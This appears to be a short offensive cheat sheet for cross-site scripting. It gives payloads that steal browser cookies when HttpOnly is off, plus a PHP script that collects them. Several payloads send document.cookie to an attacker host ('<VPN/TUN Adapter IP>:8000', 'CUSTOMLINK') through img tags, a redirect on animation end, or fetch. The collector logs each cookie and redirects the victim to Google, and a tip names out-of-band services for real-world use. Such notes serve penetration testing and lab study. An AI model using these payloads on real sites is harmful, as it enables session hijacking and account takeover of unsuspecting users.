If HttpOnly is of:
```html
"><img src=x onerror=prompt(document.domain)>

"><img src=x onerror=confirm(1)>

"><img src=x onerror=alert(1)>

<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>
```

Server for recieving cookies:
```php
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?>
```

**N.B.** Use https://app.interactsh.com/#/ or Burp Collaborator for real word (bc of https)

HTTPS payload
```html
<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
```
if CORS and SOP policy allows ajax-requests:
```html
<script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>
```
